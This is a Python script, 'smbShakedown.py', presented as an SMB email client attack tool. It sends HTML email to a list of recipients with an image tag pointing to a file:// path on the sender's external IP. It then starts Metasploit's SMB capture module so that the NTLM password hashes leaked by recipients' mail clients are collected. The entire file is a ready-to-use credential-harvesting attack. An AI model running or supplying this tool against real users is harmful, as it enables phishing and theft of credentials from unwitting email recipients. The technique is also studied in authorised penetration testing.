#/usr/bin/python
# Description: A simplified SMB Email Client Attack script.
# Created by: Nick Sanzotta / @beamr
# Version: smbShakedown.py v 1.9112016
import os, sys, smtplib, getpass, readline, socket, time
import urllib, json
import readline
readline.parse_and_bind("tab: complete")

rcfile = 'smbServ.rc'

class colors:
   white = "\033[1;37m"
   normal = "\033[0;00m"
   red = "\033[1;31m"
   blue = "\033[1;34m"
   green = "\033[1;32m"
   x = "\033[1;35m"

banner = colors.x + r"""
                  __        
                 /\ \       
  ____    ___ ___\ \ \____  
 /',__\ /' __` __`\ \ '__`\ 
/\__, `\/\ \/\ \/\ \ \ \L\ \
\/\____/\ \_\ \_\ \_\ \_,__/
 \/___/  \/_/\/_/\/_/\/___/ 

 ____    __                __                 __                                 
/\  _`\ /\ \              /\ \               /\ \                                
\ \,\L\_\ \ \___      __  \ \ \/'\      __   \_\ \    ___   __  __  __    ___    
 \/_\__ \\ \  _ `\  /'__`\ \ \ , <    /'__`\ /'_` \  / __`\/\ \/\ \/\ \ /' _ `\  
   /\ \L\ \ \ \ \ \/\ \L\.\_\ \ \\`\ /\  __//\ \L\ \/\ \L\ \ \ \_/ \_/ \/\ \/\ \ 
   \ `\____\ \_\ \_\ \__/.\_\\ \_\ \_\ \____\ \___,_\ \____/\ \___x___/'\ \_\ \_\
    \/_____/\/_/\/_/\/__/\/_/ \/_/\/_/\/____/\/__,_ /\/___/  \/__//__/   \/_/\/_/

"""+'\n' \
+ colors.x + '\n smbShakedown.py v1.9112016' \
+ colors.normal + '\n Description: A simplified SMB Email Client Attack script.'\
+ colors.normal + '\n Created by: Nick Sanzotta/@beamr' + '\n'\
+ colors.normal + ' ' + '*' * 95 +'\n' + colors.normal

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_external_address():
	data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
	print("External IP: "+data["ip"])
	return data["ip"]

def get_internal_address():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	print("Internal IP: "+s.getsockname()[0])
	return s.getsockname()[0]

def smbServ():
	smbServOption = raw_input("\nLaunch Metasploit's SMB Capture module?[yes]:") or 'yes'
	choice = smbServOption.lower()
	yes = set(['yes','y', 'ye', ''])
	no = set(['no','n'])
	print('ENTERED: "%s"' % choice + "\n")
	if choice in yes:
		with open(rcfile, 'w') as f1:
			f1.write("use auxiliary/server/capture/smb"+"\n"+\
				"set srvhost "+get_internal_address()+"\n"+\
				"exploit -j -z")
		os.system('msfconsole -q -r smbServ.rc')
	elif choice in no:
		print("Ok, remember to setup your SMBCapture Server elsewhere. \n")
	else:
		sys.stdout.write("Please respond with 'yes' or 'no'")

def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipientAddress, emailMessage):
	smtpserver = smtplib.SMTP(smtpServerAddress, smtpServerPort)
	smtpserver.ehlo()
	smtpserver.starttls()
	smtpserver.ehlo
	smtpserver.login(smtpUser, smtpPassword)
	print("Testing Connection to your SMTP Server...")
	time.sleep(1)
	try:
		status = smtpserver.noop()[0]
		print("SMTP Server Status: ",status)
		sendOption = raw_input("Connection to SMTP Server is successful, would you like to send mail now?[yes]:") or 'yes'
		choice = sendOption.lower()
		yes = set(['yes','y', 'ye', ''])
		no = set(['no','n'])
		print('ENTERED: "%s"' % choice + "\n")
		if choice in yes:
			smtpserver.sendmail(senderAddress, recipientAddress, emailMessage)
			print("Message(s) sent!")
			smtpserver.quit()
			return True
		elif choice in no:
			smtpserver.quit()
			print("Ok no mail sent.")
			return False
		else:
			sys.stdout.write("Please respond with 'yes' or 'no'")
	except:
		status = -1
		print("[Aborting]SMTP Server Status: ",status)
	return True if status == 250 else False

def main():
	cls()
	print(banner)
	extipAddress = get_external_address()
	ipAddress = get_internal_address()
	print("\n")
	smtpServerAddress = raw_input('Enter SMTP Server address[smtp.gmail.com]: ') or 'smtp.gmail.com'
	print('ENTERED: "%s"' % smtpServerAddress + "\n")
	smtpServerPort = raw_input('Enter your SMTP Server Port[587]: ') or 587
	print('ENTERED: "%s"' % smtpServerPort + "\n")
	smtpUser = raw_input('Enter SMTP Server username[user@gmail.com]: ')
	print('ENTERED: "%s"' % smtpUser + "\n")
	smtpPassword = getpass.getpass(r'Enter SMTP Server password: ')
	print("\n")
	smbCaptureServer = raw_input('Enter SMB Capture Server IP address['+ipAddress+']: ') or  ipAddress
	print('ENTERED:' "%s" % smbCaptureServer + "\n")
	senderName = raw_input('Enter "from name":[Tester]') or  'Tester'
	print('ENTERED:' "%s" % senderName + "\n")
	senderAddress = raw_input('Enter "from address":['+smtpUser+']') or  smtpUser
	print('ENTERED:' "%s" % senderAddress + "\n")
	recipientName = raw_input('Enter recipient(s) name[Client]: ') or 'client'
	print('ENTERED:' "%s" % recipientName + "\n")
	try:
		print('TIP: For multiple addresses, enter a file or seperate with a comma\n'\
		'EX:/opt/emailAddresses.txt or user1@company.com,user2@company.com')
		rawrcptAddress = raw_input('Enter recipient addresses[File or individual email(s)]): ')
		print('ENTERED:' "%s" % rawrcptAddress + "\n")
		with open(rawrcptAddress, 'r') as f1:
			x = f1.read()
		recipientAddress = x.split()
		print(recipientAddress)
		print("\n")
	except IOError:
		recipientAddress=rawrcptAddress.split(',')
		print('ENTERED:' "%s" % recipientAddress + "\n")

### EDIT: Email Message Template Below ###
### Becareful not to remove the variables {0},{1},{2},{3} and {4} ###
	message = """From: {0} <{1}>
To: {2} <{3}>
MIME-Version: 1.0
Content-type: text/html
Subject: smbShakedown.py test.


...
<b>smbShakedown.py test message.</b>
<br>
<img src=file://{4}/image/foo.gif>
"""
##########################################################
	emailMessage = message.format(senderName, senderAddress, recipientName, recipientAddress, extipAddress)
	print('Email Message Template Below:')
	time.sleep(1)
	print(emailMessage)
	smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipientAddress, emailMessage)
	time.sleep(1)
	smbServ()
if __name__ == "__main__":
	main()
